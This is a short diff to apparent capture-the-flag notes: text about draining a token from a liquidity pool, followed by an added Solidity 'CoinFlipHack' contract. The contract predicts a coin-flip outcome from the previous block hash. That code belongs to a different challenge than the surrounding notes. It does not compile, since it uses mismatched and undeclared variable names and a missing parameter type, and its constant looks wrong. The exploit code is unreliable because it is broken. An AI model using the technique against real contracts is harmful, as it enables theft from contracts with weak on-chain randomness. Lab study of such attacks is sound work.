@@ -16,3 +16,27 @@ advantage of liquidity pool : there need not be two ppl who want to swap tokens 
 
 the aim is to drain any one of the two tokens completely from the pool .
 
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ICoinFlip {
+    function flip(guessing) external returns (bool);
+}
+
+contract CoinFlipHack {
+    ICoinFlip public coinFlip;
+    uint256 FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;
+
+    constructor(address _coinFlipAddress) {
+        coinFlip = ICoinFlip(coinFlipAddress);
+    }
+
+    function hackFlip() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlipResult = blockValue / FACTOR;
+        guessing = coinFlipResult == 1 ? true : false;
+        coinFlip.flip(guess);
+    }
+}
+```
